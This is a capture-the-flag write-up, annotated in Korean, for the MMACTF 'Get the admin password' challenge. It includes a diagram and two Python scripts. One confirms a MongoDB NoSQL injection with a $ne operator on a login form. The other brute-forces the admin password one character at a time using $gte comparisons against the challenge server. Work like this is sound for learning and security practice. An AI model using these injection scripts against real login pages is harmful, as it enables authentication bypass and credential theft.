================================================================================================================
[MMACTF] Get the admin password
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4 -> step6 -> step8 -> step10 -> step12;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5 -> step7 -> step9 -> step11 -> step13;
        }
        step0 -> step1[label="post_data: {user=admin&password[$ne]=1}",arrowhead="normal"];
        step3 -> step2[label="login success",arrowhead="normal"];
        step4 -> step5[label="post_data: {user=admin&password[$gte]=T}",arrowhead="normal"];
        step7 -> step6[label="login success",arrowhead="normal"];
        step8 -> step9[label="post_data: {user=admin&password[$gte]=U}",arrowhead="normal"];
        step10 -> step11[label="login fail",arrowhead="normal"];

    }

|

취약점 존재 여부 확인
================================================================================================================

- POST 로그인 페이지 취약점
- MongoDB, Blind Injection
- $ne 연산자를 통해 취약점 존재를 확인

.. code-block:: python

    import requests

    url = "http://gap.chal.ctf.westerns.tokyo/login.php"

    data = {
        "user": "admin",
        "password[$ne]":"1"
    }
    r = requests.post(url, data=data, verify=False)

    print r.content


|

무차별 대입
================================================================================================================

$gte 연산자를 이용하여 무작위 대입을 진행하여 True를 출력하는 결과를 확인합니다.

.. code-block:: python

    import requests

    url = "http://gap.chal.ctf.westerns.tokyo/login.php"

    result = ''
    while 10:
        for l in reversed(range(33,127)):
            data = {
                "user": "admin",
                "password[$gte]":result + chr(l)
            }
            r = requests.post(url, data=data, verify=False)

            if "TWCTF" in r.content:
                result += chr(l)
                print result
                break

